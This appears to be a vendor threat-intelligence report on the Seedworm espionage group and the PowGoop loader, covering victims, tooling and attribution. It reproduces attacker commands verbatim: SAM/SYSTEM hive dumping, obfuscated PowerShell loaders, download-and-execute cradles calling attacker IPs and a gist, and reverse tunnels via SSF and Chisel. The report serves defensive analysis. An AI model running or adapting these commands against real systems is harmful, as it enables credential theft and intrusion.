The Iran-linked espionage group Seedworm (aka MuddyWater) has been highly active in recent months, attacking a wide range of targets, including a large number of government organizations in the Middle East.

Many of the organizations attacked by Seedworm in recent months have also been targeted by a recently discovered tool called PowGoop (Downloader.Covic), suggesting that it is a tool that Seedworm has incorporated into its arsenal. However, at present Symantec, a division of Broadcom (NASDAQ: AVGO), can only make a medium-confidence link between Seedworm and PowGoop.

The recent wave of Seedworm attacks were uncovered by Symantec’s Targeted Attack Cloud Analytics, which leverages advanced machine learning to spot patterns of activity associated with targeted attacks. The activity was reviewed by Symantec’s Threat Hunter team (part of Symantec’s Endpoint Security Complete offering) which linked it to previous Seedworm activity.

Among the things flagged by Cloud Analytics was a registry key called “SecurityHealthCore". The code residing in this registry key is executed by PowerShell from a scheduled task. In all of the organizations where this registry key was found, a known Seedworm backdoor (Backdoor.Mori) was subsequently detected.

Attacks were uncovered against targets in Iraq, Turkey, Kuwait, the United Arab Emirates, and Georgia. In addition to some government entities, organizations in the telecoms and computer services sector were also targeted.

In one such victim, a sample of Backdoor.Mori was dropped and installed as early as December 2019 on a SQL server. Seedworm activity continued until at least July 2020, with the installation of additional hacking tools by the attackers.
.During this time, Symantec observed Seedworm performing credential-stealing activities as well as setting up tunnels to its own infrastructure to assist with lateral movement using an open-source tools known as Secure Sockets Funneling (SSF) and Chisel. Seedworm is known to have leveraged Chisel in the past.

Credential stealing

Credential dumping was done by dumping the contents of the Windows Registry to files in the same directories as Seedworm backdoors. Additionally, Seedworm was also observed using Quarks password dumper (Quarks PwDump) to steal local account password hashes.


	reg save hklm\system CSIDL_PROFILE\public\system.c
	reg save hklm\sam CSIDL_PROFILE\public\sam.c
	CSIDL_COMMON_APPDATAump.exe --dump-hash-local (sha2: f9c4f95592d0e543bca52f5882eace65fe3bbbb99bcaae6e97000115fb3cb781)


Tunneling back to the attackers’ infrastructure

Seedworm was also observed setting up tunnels to its own infrastructure using Secure Sockets Funneling and Chisel. These tools allow the attackers to configure local and remote port forwarding as well as copying files to compromised machines.
.The PowGoop connection

On the same machine where Seedworm was active, a tool known as PowGoop was deployed. This same tool was also deployed against several of the organizations attacked by Seedworm in recent months; however, at present Symantec can only establish a medium-confidence link between PowGoop and Seedworm.

PowGoop, which was first publicly reported on in July 2020, is a loader DLL. It likely arrives in a ZIP file named ‘google.zip’ containing the loader itself and legitimate Google binaries used for side-loading it.

In the same organization as mentioned previously, Symantec observed Seedworm activity which was followed by PowGoop activity just six days later.
.In the majority of recent infections, PowGoop appears to have been deployed via a remote execution tool known as Remadmin. This tool is used to execute PowerShell to read and decode the contents of a file which is used to execute the contents in memory. It appears this code is used to load PowGoop’s main DLL (goopdate.dll) via rundll32.exe.


	powershell -exec bypass "$a=gc C:\WINDOWS\TEMP\ManyaBetta;del C:\WINDOWS\TEMP\ManyaBetta;function Gabrielle($OliviaTomi){$Emlyn = [System.Convert]::FromBase64String($OliviaTomi);return [System.Text.Encoding]::UTF8.GetString($Emlyn);}function Tina($Daisi){$OliviaTomi = [System.Text.Encoding]::UTF8.GetBytes($Daisi);for ($TheresitaNitaChad=0; $TheresitaNitaChad -le $OliviaTomi.count -1; $TheresitaNitaChad++){$OliviaTomi[$TheresitaNitaChad] = $OliviaTomi[$TheresitaNitaChad] - 2;}return [System.Text.Encoding]::UTF8.GetString($OliviaTomi);}function GlyndaMaureen($OliviaTomi){$Rosalinde = Gabrielle $OliviaTomi;$LeonaJolene = Tina $Rosalinde;return $LeonaJolene;};$t =GlyndaMaureen($a);&($ShellId[1] + 'ex') $t;"


A feature of these files is that they have distinctive variable and function naming that resembles human names concatenated together. We have no reason to believe that these are actual people’s names.

On several of the victim machines, a ZIP file called ‘google.zip’ was also found present in the same directory. How the ZIP file arrives on the victim’s computer remains unknown. The ZIP contains a mix of legitimate Google executables and malicious DLL files. A legitimate ‘googleupdate.exe’ file is used to side load PowGoop via rundll32.exe. PowGoop loaders are used to decode and execute the contents of a file called ‘config.txt’. All config.txt files found to date contained PowerShell scripts that download and execute more PowerShell code.


	powershell -exec bypass "function bdec($in){$out = [System.Convert]::FromBase64String($in);return [System.Text.Encoding]::UTF8.GetString($out);}function bDec2($szinput){$in = [System.Text.Encoding]::UTF8.GetBytes($szinput);for ($i=0; $i -le $in.count -1; $i++){$in[$i] = $in[$i] - 2;}return [System.Text.Encoding]::UTF8.GetString($in);}function bDd($in){$dec = bdec $in;$temp = bDec2 $dec;return $temp;}$a=get-content " config.txt";$t =bDd $a;&($ShellId[1] + 'ex') $t;"
	Rundll32.exe CSIDL_COMMON_APPDATA\andreavania\goopdate.dll,dllregisterserver


In some cases, PowGoop is used to launch ‘Wscript.exe’ to execute an unknown VBS file called ‘v.txt’.


	"CSIDL_SYSTEM\wscript.exe" /e:vbs CSIDL_PROFILE\[REDACTED]ocuments\v.txt


Similarly, Symantec also observed legitimate tools (openssl.exe) and a downloader tool (ssleay32.dll) present in the same directories used to download additional tools:


	CSIDL_SYSTEM\rundll32.exe CSIDL_COMMON_APPDATA\georgettaemilee\ssleay32.dll ,DllRegisterServer http://107.173.141.103:443/downloadc.php?key=[REDACTED]
	CSIDL_SYSTEM\rundll32.exe CSIDL_COMMON_APPDATA\samariaantonina\ssleay32.dll ,DllRegisterServer http://107.173.141.114:443/downloadc.php?key=[REDACTED]


Similar download requests were also observed via PowerShell:


	powershell -exec bypass $V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$AaA = "Do";$AaB = " wnloadStr";$AaC = "ing";$s="$AaA$AaB$AaC"('http://23.95.220.166:80/download.php?k=564');$s;"
	$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;start-sleep 10;$s=$V.DownloadString('http://104.168.44.16:443/H6qy8yvXhV69mF8CgpmWwKb1oV19xMqaI');iex($s)


During PowGoop activity, Symantec also observed the attackers using the Secure Sockets Funneling tool as well as Chisel suggesting a link between the two sets of activity.


	"CSIDL_PROFILE\[REDACTED]ocuments\ussf.exe" -c CSIDL_PROFILE\[REDACTED]ocuments\config.txt -F 9900 -p [REDACTED] 107.172.97.172
	CSIDL_COMMON_APPDATA\sharp.cmd client 107.175.0.140:443 R:8888:127.0.0.1:9999
	CSIDL_COMMON_APPDATA\sharp.cmd server -p [REDACTED] --socks5


Additional links between Seedworm and PowGoop

In several recent Seedworm attacks, PowGoop was used on computers that were also infected with known Seedworm malware (Backdoor.Mori). In addition to this, activity involving Seedworm’s Powerstats (aka Powermud) backdoor appears to have been superseded by DLL side-loading of PowGoop.

Additionally, during PowGoop activity, we also observed the attackers downloading tools and some unknown content from GitHub repos, similar to what has been reported on Seedworm‘s Powerstats in the past.


	powershell -exec bypass $e=new-object net.webclient;$e.proxy=[Net.WebRequest]::GetSystemWebProxy();$e.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$aa=$e.DownloadString('https://gist.githubusercontent.com/ffcommax/24587757d3328672954e4155a45ceb02/raw/58954a192b9f10753ad140128b97e54a663ae443/123.txt');iex($aa)


These patterns of activity beg the question as to whether PowGoop is actually an evolution of Powerstats rather than a completely new tool. To date, there is insufficient evidence to confirm this hypothesis. However, there are several similarities between the tools:


	Use of hard-coded GUID tokens and proxy URLs for command and control (C&C) communications
	Fetching and executing commands from C&C servers using PowerShell
	Some low-confidence similarities in code structure and encoding techniques


While none of this is sufficient to confirm that PowGoop has evolved from Powerstats, Symantec continues to monitor the activity of Seedworm for any additional evidence.

Thanos ransomware link

PowGoop has, in recent weeks, been loosely linked to a variant of ransomware known as Thanos. Thanos is an aggressive form of ransomware which, in addition to encryption, will also attempt to overwrite the master boot record (MBR) of the infected computer.

Our peers at Palo Alto Networks reported that PowGoop was found at a Middle Eastern state-run organization which was also hit by Thanos. This lead to the suspicion that the Thanos attackers were using PowGoop in their attacks; however, Palo Alto could not confirm the connection.

Symantec has not found any evidence of a wiper or ransomware on computers infected with PowGoop. This suggests that either the simultaneous presence of PowGoop and Thanos in one attack was a coincidence or, if the two are linked, that PowGoop is not used exclusively to deliver Thanos.

Symantec uncovered attacks involving PowGoop against organizations in Iraq, Afghanistan, Israel, Turkey, Azerbaijan, Georgia, Cambodia, and Vietnam. Sectors targeted included governments, technology, telecoms, oil and gas, real estate, and education.

Vigilance required

Seedworm has been one of the most active Iran-linked groups in recent months, mounting apparent intelligence-gathering operations across the Middle East. While the connection between PowGoop and Seedworm remains tentative, it may suggest some retooling on Seedworm’s part. Any organizations who do find evidence of PowGoop on their networks should exercise extreme caution and perform a thorough investigation.
